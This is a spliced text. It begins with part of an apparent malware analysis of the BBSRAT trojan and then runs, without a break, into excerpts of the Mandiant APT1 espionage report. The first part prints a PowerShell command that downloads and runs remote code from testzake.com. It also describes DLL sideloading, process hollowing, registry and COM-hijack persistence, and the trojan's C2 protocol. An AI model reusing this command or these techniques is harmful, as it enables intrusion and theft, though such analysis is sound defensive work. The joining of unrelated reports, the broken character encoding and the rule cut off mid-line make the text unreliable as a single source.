expand.exe utility provided by Microsoft Windows, the dropper executes the following command, which will expand the CAB file and write the results to the provided directory:\\nexpand.exe “%TEMP%\\\\temp_file” Destination “chosen_path\\\\SSONSVR”\\nThis results in the following three files being written to the SSONSVR directory:\\naclmain.sdb\\npnipcn.dll\\nssonsvr.exe\\nThe ‘ssonsvr.exe’ file is a legitimate Citrix executable that will be used to sideload the malicious ‘pnipcn.dll’ file. The ‘aclmain.sdb’ file contains code that will eventually be loaded by the ‘pnipcn.dll’ file.\\nThe malware finally executes ‘ssonsvr.exe’ via a call to ShellExecuteW.\\nFigure 5 Execution flow of dropper expanding CAB file\\nWhen ‘ssonsvr.exe’ is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:\\n%SystemRoot%\\\\System32\\\\msiexec.exe\\nIt will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds to load code from the ‘aclmain.sdb’ file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.\\nFigure 6 Sideloading execution flow\\nIn order to ensure persistence, the following registry key is written on the victim’s machine:\\nHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ssonsvr.exe : path_to_ssonsvr.exe\\nDeployment Technique #2\\nIn the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit framework.\\nWhen the downloader executes, it will first decrypt the following two strings using a 5-byte XOR key of “\\\\x01\\\\x02\\\\x03\\\\x04\\\\x05”:\\n“powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(‘http://testzake.com/IR.ps1’);Invoke-ReflectivePEInjection -PEUrl http://testzake.com/s.exe”\\n“C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(‘http://testzake.com/IR.ps1’);Invoke-ReflectivePEInjection -PEUrl http://testzake.com/s.exe”\\nThese strings are then sequentially executed via calls to WinExec. As we can see, the second command is specifically crafted to run on 64-bit versions of Microsoft Windows. The commands in question will download an executable file and run it within the context of the powershell process.\\nWhen the above commands are executed, the downloader will initially download the ‘IR.ps1’ powershell script from the specified URL:\\nFigure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script\\nThis Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made. The malware then invokes this script with a URL that points to an additional executable file. This downloaded executable contains a copy of the BBSRAT malware family.\\nThe downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded. This DLL is dropped to one of the following locations:\\n%SYSTEMROOT%\\\\web\\\\srvcl32.dll\\n%APPDATA%\\\\web\\\\srvcl32.dll\\nAdditionally, the following registry keys are set depending on the system’s CPU architecture:\\nHKU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32\\\\ThreadingModel – “Both”\\nHKU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32\\\\Default – path_to_srvcl32.dll\\nHKLM\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\\\InprocServer32\\\\ThreadingModel – “Both”\\nHKLM\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\\\InprocServer32\\\\Default – path_to_srvcl32.dll\\nThe COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to ‘MruPidlList’, while the COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to ‘Microsoft WBEM New Event Subsystem’. This ensures that the DLL specified will load when Microsoft Windows starts. It is a technique that was used by the ZeroAccess rootkit when it initially surfaced.\\nBBSRAT Execution\\nAfter being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime:\\nntdll.dll\\nkernel32.dll\\nuser32.dll\\nadvapi32.dll\\ngdi32.dll\\nws2_32.dll\\nshell32.dll\\npsapi.dll\\nSecur32.dll\\nWtsApi32.dll\\nNetapi32.dll\\nVersion.dll\\nCrypt32.dll\\nWininet.dll\\nThe following mutex is then created to ensure a single instance of BBSRAT is running at a given time:\\nGlobal\\\\GlobalAcProtectMutex\\nThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:\\nFigure 8 BBSRAT calling WSAStartup function\\nThe malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for network communication. This includes a series of HTTP or HTTPS requests, such as the following:\\nGET /bbs/1/forum.php?sid=1 HTTP/1.1\\nCookie: A46A8AA9-D7D6-43FB-959DC96E\\nContent-Length:\\nUser-Agent: Mozilla/4.0 (compatible; Windows NT 5.1)\\nConnection: Keep-Alive\\nHost: transactiona.com\\nCache-Control: no-cache\\nAccept: */*\\nContent-Type:\\nIn the above example, the ‘1’ used both in the URI and the sid GET parameter is a global incremental counter. Every subsequent request made by BBSRAT increments this counter by one. Additionally, all variants of BBSRAT we have found use the same URL for command and control (C2) communication.\\nWhen first executed, the malware will exfiltrate data about the victim’s machine via a POST request to the ‘/bbs/counter/forum.php?sid=counter’ URL. All network data sent via POST requests uses a custom binary structure, as defined as the following:\\nstruct network_header\\n{\\nDWORD random;\\nDWORD hardcoded0;\\nDWORD hardcoded1;\\nDWORD command;\\nDWORD length_of_compressed_data;\\nDWORD length_of_decompressed_data;\\nDWORD unknown2;\\nBYTE compressed_data;\\n};\\n1234567891011\\nstruct network_header{ DWORD random; DWORD hardcoded0; DWORD hardcoded1; DWORD command; DWORD length_of_compressed_data; DWORD length_of_decompressed_data; DWORD unknown2; BYTE compressed_data;};\\nThe compressed_data field is compressed using the common ZLIB compression algorithm. Additionally, in the event data is being sent via HTTP rather than HTTPS, the following additional encryption algorithm is applied to the POST data:\\ndef decrypt(data):\\nout = \\nfor x in data:\\nt = (ord(x) - 23)\\nt1 = (t ^ 62)\\nt2 = (t1 + 23) & 0xFF\\nout.append(chr(t2))\\nreturn out\\n12345678\\ndef decrypt(data): out =  for x in data: t = (ord(x) - 23)\\nt1 = (t ^ 62)\\nt2 = (t1 + 23) & 0xFF out.append(chr(t2)) return out\\nThe following data structure holds the victim’s information that is uploaded by BBSRAT:\\nstruct victim_information\\n{\\nDWORD static_value;\\nDWORD major_version;\\nDWORD minor_version;\\nDWORD build_number;\\nDWORD platform_id;\\nDWORD default_locale;\\nDWORD unknown;\\nDWORD local_ip_address;\\nDWORD running_as_64_bit;\\nDWORD random;\\nDWORD unknown2;\\nDWORD struct_length;\\nDWORD struct_with_not_used_length;\\nDWORD struct_with_username_length;\\nDWORD struct_with_group_length;\\nDWORD unknown3;\\nDWORD struct_with_hostname_length;\\nWCHAR not_used??;\\nWCHAR username??;\\nWCHAR group??;\\nWCHAR hostname??;\\n};\\n123456789101112131415161718192021222324\\nstruct victim_information{ DWORD static_value; DWORD major_version; DWORD minor_version; DWORD build_number; DWORD platform_id; DWORD default_locale; DWORD unknown; DWORD local_ip_address; DWORD running_as_64_bit; DWORD random; DWORD unknown2; DWORD struct_length; DWORD struct_with_not_used_length; DWORD struct_with_username_length; DWORD struct_with_group_length; DWORD unknown3; DWORD struct_with_hostname_length; WCHAR not_used??; WCHAR username??; WCHAR group??; WCHAR hostname??;};\\nBBSRAT accepts many possible commands that the C2 server can provide. These commands are sent as a response to the GET beacons that are continually requested via either HTTP or HTTPS. The following commands and sub-commands have been identified:\\nCommand\\nSub-command\\nDescription\\n0x110010\\nN/A\\nBeacon\\n0x110011\\nN/A\\nUninstall/Kill Malware\\n0x110020\\nN/A\\nUpload Victim Information\\n0x110064\\n0x2\\nExecute Command and Return Response\\n0x110064\\n0x4\\nUnknown\\n0x110064\\n0x5\\nExecute Shellcode\\n0x110066\\n0x7\\nQuery Service Configuration\\n0x110066\\n0x9\\nStart Service\\n0x110066\\n0xa\\nStop Service\\n0x110066\\n0xb\\nDelete Service\\n0x110066\\n0xc\\nChange Service Configuration\\n0x110063\\n0xd\\nEnumerate Running Processes\\n0x110063\\n0xf\\nKill Process\\n0x110063\\n0x10\\nGet Process Information\\n0x110063\\n0x12\\nFree Library for Specified Process\\n0x110065\\n0x1b\\nExecute Command Quietly\\n0x110065\\n0x1e\\nSend Input to Console\\n0x110065\\n0x1f\\nExecute Shellcode\\n0x110061\\n0x20\\nList Drive Information\\n0x110061\\n0x21\\nList File Information For Given Directory\\n0x110061\\n0x23\\nWrite File\\n0x110061\\n0x24\\nRead File\\n0x110061\\n0x25\\nList File Information For Given Directory\\n0x110061\\n0x27\\nPerform File Operation via SHFileOperation()\\n0x110061\\n0x28\\nDelete File\\n0x110061\\n0x29\\nCreate Directory\\n0x110061\\n0x2a\\nShell Execute\\nPlease refer to the appendix for a full list of identified BBSRAT samples and their associated C2 servers.\\nConclusion\\nAs in many of the previous articles regarding espionage-motivated adversaries and possible nation-state campaigns, what is being observed in this attack campaign is a continued operation and evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have become public knowledge. Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook. We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively secure themselves and prevent attacks.\\nWildFire properly classifies BBSRAT malware samples as malicious. We have released DNS signatures to block access to the C2 domain names included in this report. AutoFocus users can explore these attacks using the BBSRAT malware family tag.\\nAppendix\\nYARA Rule\\nrule bbsrat {\\nmeta:\\nauthor = \"Tyler Halfpop\"\\ncompany = \"Palo Alto

Mandiant APT1 2 www.mandiant.com EXECUTIVE SUMMARY Since 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world. The majority of these security breaches are attributed to advanced threat actors referred to as the ﬁAdvanced Persistent Threatﬂ (APT). We ˜rst published details about the APT in our January 2010 M-Trends report. As we stated in the report, our position was that ﬁThe Chinese government may authorize this activity, but there™s no way to determine the extent of its involvement.ﬂ Now, three years later, we have the evidence required to change our assessment. The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them.3 Mandiant continues to track dozens of APT groups around the world; however, this report is focused on the most proli˜c of these groups. We refer to this group as ﬁAPT1ﬂ and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most proli˜c cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1™s operations compelled us to write this report.The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted. Though our visibility of APT1™s activities is incomplete, we have analyzed the group™s intrusions against nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1™s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others.Our analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China™s cyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign in large part because it receives direct government support. In seeking to identify the organization behind this activity, our research found that People™s Liberation Army (PLA™s) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate.3 Our conclusions are based exclusively on unclassi˜ed, open source information derived from Mandiant observations. None of the information in this report involves access to or con˜rmation by classi˜ed intelligence. Mandiant APT1 3 www.mandiant.com KEY FINDINGSAPT1 is believed to be the 2nd Bureau of the People™s Liberation Army (PL A) General Staff Department™s (GSD) 3rd Department (), which is most commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398 (61398).»The nature of ﬁUnit 61398™sﬂ work is considered by China to be a state secret; however, we believe it engages in harmful ﬁComputer Network Operations.ﬂ »Unit 61398 is partially situated on Datong Road () in Gaoqiaozhen (), which is located in the Pudong New Area () of Shanghai (). The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007.»We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit 61398™s physical infrastructure. »China Telecom provided special ˜ber optic communications infrastructure for the unit in the name of national defense.»Unit 61398 requires its personnel to be trained in computer security and computer network operations and also requires its personnel to be pro˜cient in the English language. »Mandiant has traced APT1™s activity to four large networks in Shanghai, two of which serve the Pudong New Area where Unit 61398 is based.APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously. 4»Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries.»APT1 has a well-de˜ned attack methodology, honed over years and designed to steal large volumes of valuable intellectual property. »Once APT1 has established access, they periodically revisit the victim™s network over several months or years and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists from victim organizations™ leadership. »APT1 uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email Š GETMAIL and MAPIGET. »APT1 maintained access to victim networks for an average of 356 days.5 The longest time period APT1 maintained access to a victim™s network was 1,764 days, or four years and ten months. »Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of compressed data from a single organization over a ten-month time period. »In the ˜rst month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different industries.4 We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted. Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report.5 This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network. Mandiant APT1 4 www.mandiant.com APT1 focuses on compromising organizations across a broad range of industries in English-speaking countries. »Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language. »The industries APT1 targets match industries that China has identi˜ed as strategic to their growth, including four of the seven strategic emerging industries that China identi˜ed in its 12th Five Year Plan. APT1 maintains an extensive infrastructure of computer systems around the world.»APT1 controls thousands of systems in support of their computer intrusion activities. »In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were registered to organizations in China (709), followed by the U.S. (109). »In the last three years we have observed APT1 use fully quali˜ed domain names (FQDNs) resolving to 988 unique IP addresses.»Over a two-year period (January 2011 to January 2013) we con˜rmed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user with an interactive graphical interface to a system.»In the last several years we have con˜rmed 2,551 FQDNs attributed to APT1. In over 97% of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure, APT1 used IP addresses registered in Shanghai and systems set to use the Simpli˜ed Chinese language.»In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1 operator™s keyboard layout setting was ﬁChinese (Simpli˜ed) Š US Keyboardﬂ. Microsoft™s Remote Desktop client con˜gures this setting automatically based on the selected language on the client system. Therefore, the APT1 attackers likely have their Microsoft® operating system con˜gured to display Simpli˜ed Chinese fonts.»817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to China.»We observed 767 separate instances in which APT1 intruders used the ﬁHUC Packet Transmit Toolﬂ or HTRAN to communicate between 614 distinct routable IP addresses and their victims™ systems using their attack infrastructure. Of the 614 distinct IP addresses used for HTRAN communications: ˚614 of 614 (100%) were registered in China.˚613 (99.8%) were registered to one of four Shanghai net blocks. Mandiant APT1 5 www.mandiant.com The size of APT1™s infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators. »We conservatively estimate that APT1™s current attack infrastructure includes over 1,000 servers. »Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly supported by linguists, open source researchers, malware authors, industry experts who translate task requests from requestors to the operators, and people who then transmit stolen information to the requestors. »APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who handle ˜nances, facility management, and logistics (e.g., shipping).In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing three personas that are associated with APT1 activity. »The ˜rst persona, ﬁUglyGorillaﬂ, has been active in computer network operations since October 2004. His activities include registering domains attributed to APT1 and authoring malware used in APT1 campaigns. ﬁUglyGorillaﬂ publicly expressed his interest in China™s ﬁcyber troopsﬂ in January 2004. »The second persona, an actor we call ﬁDOTAﬂ, has registered dozens of email accounts used to conduct social engineering and spear phishing attacks in support of APT1 campaigns. ﬁDOTAﬂ used a Shanghai phone number while registering these accounts.»We have observed both the ﬁUglyGorillaﬂ persona and the ﬁDOTAﬂ persona using the same shared infrastructure, including FQDNs and IP ranges that we have attributed to APT1. »The third persona, who uses the nickname ﬁSuperHard,ﬂ is the creator or a signi˜cant contributor to the AURIGA and BANGAT malware families which we have observed APT1 and other APT groups use. ﬁSuperHardﬂ discloses his location to be the Pudong New Area of Shanghai.Mandiant is releasing more than 3,000 indicators to bolster defenses against APT1 operations. »Speci˜cally, Mandiant is providing the following: ˚Digital delivery of over 3,000 APT1 indicators, such as domain names, IP addresses, and MD5 hashes of malware.˚Sample Indicators of Compromise (IOCs) and detailed descriptions of over 40 families of malware in APT1™s arsenal of digital weapons. ˚Thirteen (13) X.509 encryption certi˜cates used by APT1.˚A compilation of videos showing actual attacker sessions and their intrusion activities.»While existing customers of Mandiant™s enterprise-level products , Mandiant Managed Defense and Mandiant Intelligent Response®, have had prior access to these APT1 Indicators, we are also making them available for use with RedlineŽ, our free host-based investigative tool. Redline can be downloaded at http://www.mandiant.com/ resources/download/redline. Mandiant APT1 6 www.mandiant.com ConclusionThe sheer scale and duration of sustained attacks against such a wide set of industries from a singularly identi˜ed group based in China leaves little doubt about the organization behind APT1. We believe the totality of the evidence we provide in this document bolsters the claim that APT1 is Unit 61398. However, we admit there is one other unlikely possibility:A secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398™s gates, performing tasks similar to Unit 61398™s known mission. Why We Are Exposing APT1 The decision to publish a signi˜cant part of our intelligence about Unit 61398 was a painstaking one. What started as a ﬁwhat ifﬂ discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing link in publicly understanding the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches.At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, publishing certain kinds of indicators dramatically shortens their lifespan. When Unit 61398 changes their techniques after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It is our sincere hope, however, that this report can temporarily increase the costs of Unit 61398™s operations and impede their progress in a meaningful way. We are acutely aware of the risk this report poses for us. We expect reprisals from China as well as an onslaught of criticism. Mandiant APT1 7 www.mandiant.com CHINA™S CO MPUTER NETWORK OPERAT IONS TASKING TO PLA UNIT 61398 (61398)Our research and observations indicate that the Communist Party of China (CPC,) is tasking the Chinese People™s Liberation Army (PLA,) to commit systematic cyber espionage and data theft against organizations around the world. This section provides photos and details of Unit 61398 facilities, Chinese references discussing the unit™s training and coursework requirements, and internal Chinese communications documenting the nature of the unit™s relationship with at least one state-owned enterprise. These details will be particularly relevant when we discuss APT1™s expertise, personnel, location, and infrastructure, which parallel those of Unit 61398.The Communist Party of ChinaThe PLA™s cyber command is fully institutionalized within the CPC and able to draw upon the resources of China™s state- owned enterprises to support its operations. The CPC is the ultimate authority in Mainland China; unlike in Western societies, in which political parties are subordinate to the government, the military and government in China are subordinate to the CPC. In fact, the PLA reports directly to the CPC™s Central Military Commission (CMC, ).6 This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC.We believe that the PLA™s strategic cyber command is situated in the PLA™s General Staff Department (GSD, ), speci˜cally its 3rd Department ().7 The GSD is the most senior PLA department. Similar to the U.S. Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA. Within the GSD, the 3rd Department has a combined focus on signals intelligence, foreign language pro˜ciency, and defense information 6 James C. Mulvenon and Andrew N. D.

Mandiant APT1 9 www.mandiant.com Inferring the Computer Network Operations Mission and Capabilities of Unit 61398 (61398) Publicly available references con˜rm that the PLA GSD™s 3rd Department, 2nd Bureau, is Military Unit Cover Designator (MUCD) 61398, more commonly known as Unit 61398.12 They also clearly indicate that Unit 61398 is tasked with computer network operations (CNO).13 The Project 2049 Institute reported in 2011 that Unit 61398 ﬁappears to function as the Third Department`s premier entity targeting the United States and Canada, most likely focusing on political, economic, and military-related intelligence.ﬂ14 Our research supports this and also suggests Unit 61398™s CNO activities are not limited to the U.S. and Canada, but likely extend to any organization where English is the primary language. Identifying GSD 3rd Department, 2nd Bureau as Unit 61398The care with which the PLA maintains the separation between the GSD 3rd Department, 2nd Bureau, and the MUCD 61398 can be partially observed by searching the Internet for of˜cial documents from the Chinese government that refer to both the 2nd Bureau and Unit 61398. Figure 2 shows the results of one of these queries.FIGURE 2: No results found for searching for ﬁGSD 3rd Department 2nd Bureauﬂ and ﬁUnit 61398ﬂ on any Chinese government websitesDespite our challenges ˜nding a link between the Chinese Government and Unit 61398 online, our searches did ˜nd references online indicating that the GSD 3rd Department, 2nd Bureau, is actually Unit 61398. Speci˜cally, Google indexed references to Unit 61398 in forums and resumes. Once these references were discovered by CPC censors, these postings and documents were likely modi˜ed or removed from the Internet. Figure 3 shows Google search results 12 Mark A.

This bureau already placed ˜ber-optic cable at the East Gate front entrance road pole. They need to use two ports to enter our company™s East Gate communication channel. The length is about 30m. At the same time, the second stage construction (in Gaoqiao Base) needs to enter into our company™s Shanghai Nanhui Communication Park 005 Center (special-use bureau). This military ˜ber-optic cable has already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. Upon our division™s negotiation with the 3rd Department 2nd Bureau™s communication branch, the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai Telecom will smoothly accomplish this task for the military based on the principle that national defense construction is important. After checking the above areas™ channels, our company has a relatively abundant inventory to satisfy the military™s request. This is our suggestion: because this is concerning defense construction, and also the 3rd Department 2nd Bureau is a very important communication control department, we agree to provide the requested channels according to the military™s suggested price. Because this is a one-time payment, and it is dif˜cult to use the normal renting method, we suggest our company accept one-time payment using the reason of ﬁMilitary Co-Construction with China Telecom of Communication Channelsﬂ and provide from our inventory. The military™s co-building does not interfere with our proprietary rights. If something breaks, the military is responsible to repair it and pay for the expenses. After you agree with our suggestion, we will sign an agreement with the communication branch of 61398 and implement it.Please provide a statement about whether the above suggestion is appropriate or not.

FIGURE 9: English Translation of China Telecom Memo Mandiant APT1 19 www.mandiant.com Synopsis of PLA Unit 61398˚The evidence we have collected on PLA Unit 61398™s mission and infrastructure reveals an organization that: »Employs hundreds, perhaps thousands of personnel»Requires personnel trained in computer security and computer network operations»Requires personnel pro˜cient in the English language»Has large-scale infrastructure and facilities in the ﬁPudong New Areaﬂ of Shanghai»Was the bene˜ciary of special ˜ber optic communication infrastructure provided by state-owned enterprise China Telecom in the name of national defense The following sections of this report detail APT1™s cyber espionage and data theft operations. The sheer scale and duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this campaign. We will demonstrate that the nature of APT1™s targeted victims and the group™s infrastructure and tactics align with the mission and infrastructure of PLA Unit 61398. Mandiant APT1 20 www.mandiant.com APT1: YEARS OF ESPIONAGE Our evidence indicates that APT1 has been stealing hundreds of terabytes of data from at least 141 organizations across a diverse set of industries beginning as early as 2006. Remarkably, we have witnessed APT1 target dozens of organizations simultaneously. Once the group establishes access to a victim™s network, they continue to access it periodically over several months or years to steal large volumes of valuable intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, emails and contact lists from victim organizations™ leadership. We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has committed.APT1 Puts the ﬁPersistentﬂ in APTSince 2006 we have seen APT1 relentlessly expand its access to new victims. Figure 10 shows the timeline of the 141 compromises we are aware of; each marker in the ˜gure represents a separate victim and indicates the earliest con˜rmed date of APT1 activity in that organization™s network. 26With the ephemeral nature of electronic evidence, many of the dates of earliest known APT1 activity shown here underestimate the duration of APT1™s presence in the network.FIGURE 10: Timeline showing dates of earliest known APT1 activity in the networks of the 141 organizations in which Mandiant has observed APT1 conducting cyber espionage.26 Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each year, which may re˛ect an increase in APT1™s activity. However, this increase may also simply re˛ect Mandiant™s expanding visibility into APT1™s activities as the company has grown and victims™ awareness of cyber espionage activity in their networks has improved.2006200720082009 2010201120122013Organizations compromised by APT1 over time Mandiant APT1 21 www.mandiant.com Longest time period withinwhich APT1 has continued to access a victim™s network:4 Years, 10 MonthsOnce APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years. For the organizations in Figure 10, we found that APT1 maintained access to the victim™s network for an average of 356 days. 27 The longest time period APT1 maintained access to a victim™s network was at least 1,764 days, or four years and ten months. APT1 was not continuously active on a daily basis during this time period; however, in the vast majority of cases we observed, APT1 continued to commit data theft as long as they had access to the network.APT1™s Geographic & Industry Focus The organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary language for operations. These include international cooperation and development agencies, foreign governments in which English is one of multiple of˜cial languages, and multinational conglomerates that primarily conduct their business in English. Only two victims appear to operate using a language other than English. Given that English- language pro˜ciency is required for many members of PLA Unit 61398, we believe that the two non-English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities. 27 This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network.

In the case of victims with a multinational presence, the location shown re˚ects either the branch of the organization that APT1 compromised (when known), or else is the location of the organization™s headquarters. APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identi˜ed, organized by the 20 major industries they represent. The results suggest that APT1™s mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis. Since the organizations included in the ˜gure represent only the fraction of APT1 victims that we con˜rmed directly, the range of industries that APT1 targets may be even broader than our ˜ndings suggest.Further, the scope of APT1™s parallel activities implies that the group has signi˜cant personnel and technical resources at its disposal. In the ˜rst month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries. Since we have seen that the group remains active in each victim™s network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims.

Mandiant APT1 24 www.mandiant.com We believe that organizations in all industries related to China™s strategic priorities are potential targets of APT1™s comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more heavily than others (see Figure 13), our observations con˜rm that APT1 has targeted at least four of the seven strategic emerging industries that China identi˜ed in its 12th Five Year Plan. 28 0510152005101520Information TechnologyAerospacePublic AdministrationSatellites and TelecommunicationsScientific Research and ConsultingEnergyTransportationConstruction and ManufacturingEngineering ServicesHigh-tech ElectronicsInternational OrganizationsLegal ServicesMedia, Advertising and EntertainmentNavigationChemicalsFinancial ServicesFood and AgricultureHealthcareMetals and MiningEducationIndustries Compromised by APT1FIGURE 13: Number of APT1 victims by industry. We determined each organization™s industry based on reviewing its industry classi˜cation in the Hoover™s 29 system. We also considered the content of the data that APT1 stole in each case, to the extent that this information was available.28 Joseph Casey and Katherine Koleski, Backgrounder: China™s 12th Five-Year Plan, U.S.-China Economic & Security Review Commission (2011), 19, http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed February 3, 2013. 29 http://www.hoovers.com/ Mandiant APT1 25 www.mandiant.com APT1 Data TheftAPT1 steals a broad range of information from its victims. The types of information the group has stolen relate to:»product development and use, including information on test results, system designs, product manuals, parts lists, and simulation technologies;»manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management processes;»business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, joint ventures, and acquisitions;»policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high- ranking personnel; »emails of high-ranking employees; and»user credentials and network architecture information.It is often dif˜cult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:»APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually overwritten during normal business activities.»Pre-existing network security monitoring rarely records or identi˜es the data theft.»The duration of time between the data theft and Mandiant™s investigation is often too great, and the trace evidence of data theft is overwritten during the normal course of business. »Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach.Even with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a single organization over a ten-month time period. Given the scope of APT1™s operations, including the number of organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.Largest APT1 data theft from a single organization:6.5 Terabytesover 10 monthsAlthough we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry. APT1 installed tools to create compressed ˜le archives and to extract emails and attachments. Over the following 2.5 years, APT1 stole an unknown number of ˜les from the victim and repeatedly 